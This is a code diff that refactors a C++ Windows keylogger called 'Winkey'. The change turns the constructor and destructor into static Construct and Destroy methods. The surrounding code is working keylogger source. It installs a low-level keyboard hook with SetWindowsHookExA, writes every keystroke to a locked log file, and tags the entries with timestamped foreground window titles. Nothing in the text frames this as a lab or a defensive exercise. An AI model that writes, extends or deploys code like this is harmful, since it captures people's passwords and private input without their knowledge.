@@ -1,8 +1,8 @@
 #include "winkey.h"
 
-Winkey::Winkey() {
+int Winkey::Construct() {
 	/* Create or Open the logfile */
-	gLogHandle = CreateFileA(
+	Winkey::gLogHandle = CreateFileA(
 		LOG_FILE,
 		FILE_GENERIC_WRITE,
 		0,
@@ -11,34 +11,38 @@ Winkey::Winkey() {
 		FILE_ATTRIBUTE_NORMAL,
 		nullptr
 	);
-	if (gLogHandle == INVALID_HANDLE_VALUE) {
-		throw std::runtime_error(std::format("CreateFile failed ({})\n", GetLastError()));
+	if (Winkey::gLogHandle == INVALID_HANDLE_VALUE) {
+		std::cout << std::format("CreateFile failed ({})\n", GetLastError());
+		return 1;
 	}
 
 	/* Place file ptr to FILE_END*/
 	LARGE_INTEGER size;
-	GetFileSizeEx(gLogHandle, &size);
+	GetFileSizeEx(Winkey::gLogHandle, &size);
 	LARGE_INTEGER size2;
 	LARGE_INTEGER offset;
 	ZeroMemory(&offset, sizeof offset);
-	SetFilePointerEx(gLogHandle, offset, &size2, FILE_END);
+	SetFilePointerEx(Winkey::gLogHandle, offset, &size2, FILE_END);
 
 	/* Place an exclusive flock on the logfile */
 	OVERLAPPED overlap = { 0 };
 	if (!LockFileEx(
-		gLogHandle,
+		Winkey::gLogHandle,
 		LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY,
 		0,
 		1,
 		0,
 		&overlap
 	)) {
-		throw std::runtime_error(std::format("LockFileEx failed ({})\n", GetLastError()));
+		std::cout << std::format("LockFileEx failed ({})\n", GetLastError());
+		return 1;
 	}
+
+	return 0;
 }
 
-Winkey::~Winkey() {
-	if (gLogHandle == nullptr) {
+void Winkey::Destroy() {
+	if (Winkey::gLogHandle == nullptr) {
 		return;
 	}
 
@@ -48,9 +52,8 @@ Winkey::~Winkey() {
 	if (!UnlockFileEx(gLogHandle, 0, 1, 0, &overlap)) {
 		std::cout << std::format("UnlockFileEx failed ({})\n", GetLastError());
 	}
-	CloseHandle(gLogHandle);
-
-	gLogHandle = nullptr;
+	CloseHandle(Winkey::gLogHandle);
+	Winkey::gLogHandle = nullptr;
 }
 
 int Winkey::Hook() {
@@ -70,8 +73,8 @@ int Winkey::Hook() {
 	}
 
 	/* Init first window */
-	GetWindowText(GetForegroundWindow(), gLastWindowTitle, 512);
-	gReportNextWindow = true;
+	GetWindowText(GetForegroundWindow(), Winkey::gLastWindowTitle, 512);
+	Winkey::gReportNextWindow = true;
 
 	/* Setting up keyBoard hook */
 	HHOOK kbdHook = SetWindowsHookExA(
@@ -135,7 +138,7 @@ LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
 
 		/* Writing key to file */
 		DWORD bytesWrote;
-		WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
+		WriteFile(Winkey::gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
 	}
 
 	/* Forward to next hooks ... */
@@ -165,9 +168,9 @@ LRESULT CALLBACK Winkey::onWindow(HWINEVENTHOOK hWinEventHook,
 	GetWindowText(hwnd, currentWindow, 512);
 
 	/* Compare with last window before registering the changes */
-	if (strcmp(currentWindow, gLastWindowTitle) != 0) {
-		GetWindowText(hwnd, gLastWindowTitle, 512);
-		gReportNextWindow = true;
+	if (strcmp(currentWindow, Winkey::gLastWindowTitle) != 0) {
+		GetWindowText(hwnd, Winkey::gLastWindowTitle, 512);
+		Winkey::gReportNextWindow = true;
 	}
 	return 0;
 }
@@ -213,12 +216,12 @@ std::string Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
 }
 
 void Winkey::logCurrentWindow() {
-	if (!gReportNextWindow) {
+	if (!Winkey::gReportNextWindow) {
 		return;
 	}
 
 	/* We are reporting, changing state */
-	gReportNextWindow = false;
+	Winkey::gReportNextWindow = false;
 
 	/* Getting local time */
 	std::time_t t = std::time(nullptr);
@@ -226,15 +229,15 @@ void Winkey::logCurrentWindow() {
 	localtime_s(&new_time, &t);
 
 	/* Formatting time */
-	char mbstr[100 + sizeof gLastWindowTitle] = {0};
+	char mbstr[100 + sizeof Winkey::gLastWindowTitle] = {0};
 	std::strftime(mbstr, sizeof mbstr, "%d.%m.%Y %H:%M:%S", &new_time);
 
 	/* Preparing payload to write, with time and lastWindowTitle */
-	std::string to_write = std::format("\n[{}] - '{}'\n", mbstr, gLastWindowTitle);
+	std::string to_write = std::format("\n[{}] - '{}'\n", mbstr, Winkey::gLastWindowTitle);
 
 	/* Writing payload to file */
 	DWORD bytesWrote;
-	WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
+	WriteFile(Winkey::gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
 }
 
 int __cdecl _tmain(int argc, TCHAR* argv[])
@@ -244,14 +247,13 @@ int __cdecl _tmain(int argc, TCHAR* argv[])
 		return 1;
 	}
 
-	gLogHandle = nullptr;
+	Winkey::gLogHandle = nullptr;
 
-	try {
-		auto winkey = Winkey();
-		return winkey.Hook();
-	 }
-	catch (const std::runtime_error& e) {
-		std::cout << e.what();
+	if (Winkey::Construct() == 1) {
 		return 1;
 	}
+
+	const int ret = Winkey::Hook();
+	Winkey::Destroy();
+	return ret;
 }
